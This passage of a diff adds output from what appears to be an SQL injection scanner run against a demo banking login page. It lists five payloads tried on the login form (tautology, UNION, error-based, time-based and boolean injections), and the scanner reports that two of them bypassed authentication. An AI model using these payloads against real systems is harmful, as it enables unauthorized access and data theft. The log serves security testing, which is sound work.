+  Value: ' OR 1=1--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/bank/main.jsp
+  Reason: Unexpected successful authentication
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results Summary
+────────────────────────────────────────────────────────────────────────────────
+[WARNING] [2024-11-30 14:06:43] Found 5 potential SQL injection vulnerabilities:
+================================================================================
+
+Form: login
+Found 5 vulnerabilities:
+----------------------------------------
+1. Basic Authentication Bypass
+   Value: ' OR '1'='1
+   Reason: Unexpected successful authentication
+
+2. Union Select Probe
+   Value: ' UNION SELECT NULL--
+   Reason: SQL syntax error detected
+
+3. Error Based
+   Value: ' OR 1=CONVERT(int,@@version)--
+   Reason: SQL syntax error detected
+
+4. Time Based
+   Value: '; WAITFOR DELAY '0:0:5'--
+   Reason: SQL syntax error detected
+
+5. Boolean Based
+   Value: ' OR 1=1--
+   Reason: Unexpected successful authentication
+
